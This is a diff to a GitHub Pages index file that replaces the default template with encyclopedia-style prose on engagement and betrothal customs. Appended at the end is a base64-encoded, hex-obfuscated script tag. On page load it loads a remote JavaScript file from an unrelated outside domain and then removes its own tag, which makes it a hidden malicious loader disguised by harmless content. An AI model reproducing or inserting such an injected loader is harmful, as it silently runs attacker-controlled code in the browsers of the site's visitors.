@@ -1,37 +1,21 @@
-## Welcome to GitHub Pages
+An engagement or betrothal is the period of time between a marriage proposal and the marriage itself (which is typically but not always commenced with a wedding). During this period, a couple is said to be fiancés (from the French), betrothed, intended, affianced, engaged to be married, or simply engaged. Future brides and grooms may be called fiancée (feminine) or fiancé (masculine), the betrothed, a wife-to-be or husband-to-be, respectively. The duration of the courtship varies vastly, and is largely dependent on cultural norms or upon the agreement of the parties involved.
 
-You can use the [editor on GitHub](https://github.com/pilyavskaya/Engagement/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Long engagements were once common in formal arranged marriages, and it was not uncommon for parents betrothing children to arrange marriages many years before the engaged couple were old enough. This is still common in some countries.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+There are many informal agreements or assumptions made by both parties in an engagement in modern settings, wherein either party is expected to reaffirm the strengths of their bonds to the other, in order to maintain the love and warmth one had come to appreciate from the other. This can be requested at any time, without expectation of gratitude or reciprocation, given the mutual love and understanding that fostered their engagement in the first place.
 
-### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Origin
+The origins of European engagement in marriage practice are found in the Jewish law (Torah), first exemplified by Abraham, and outlined in the last Talmudic tractate of the Nashim (Women) order, where marriage consists of two separate acts, called erusin (or kiddushin, meaning sanctification), which is the betrothal ceremony, and nissu'in or chupah,[a] the actual ceremony for the marriage. Erusin changes the couple's interpersonal status, while nissu'in brings about the legal consequences of the change of status. (However, in the Talmud and other sources of Jewish law there is also a process, called kiddushin, corresponding to what today is called engagement. Marrying without such an agreement is considered immoral. To complicate matters, erusin in modern Hebrew means engagement, not betrothal.)
 
-```markdown
-Syntax highlighted code block
+This was later adopted in Ancient Greece as the gamos and engeysis rituals, although unlike in Judaism the contract made in front of witness was only verbal. The giving of a ring was eventually borrowed from Judaism by Roman marriage law, with the fiancé presenting it after swearing the oath of marriage intent, and presenting of the gifts at the engagement party.
 
-# Header 1
-## Header 2
-### Header 3
+Betrothal
+"Betrothed" redirects here. For other uses, see Betrothed (disambiguation).
 
-- Bulleted
-- List
+Modern engagement gifts basket in Bangladesh.
+Betrothal (also called espousal) is a formal state of engagement to be married.
 
-1. Numbered
-2. List
+In Jewish weddings during Talmudic times (c.1st century BC – 6th century AD), the two ceremonies of betrothal (erusin) and wedding usually took place up to a year apart; the bride lived with her parents until the actual marriage ceremony (nissuin), which would take place in a room or tent that the groom had set up for her. Since the Middle Ages the two ceremonies have taken place as a combined ceremony performed in public. The betrothal is now generally part of the Jewish wedding ceremony, accomplished when the groom gives the bride the ring or another object of at least nominal value. As mentioned above, betrothal in Judaism is separate from engagement; breaking a betrothal requires a formal divorce, and violation of betrothal is considered adultery
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/pilyavskaya/Engagement/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
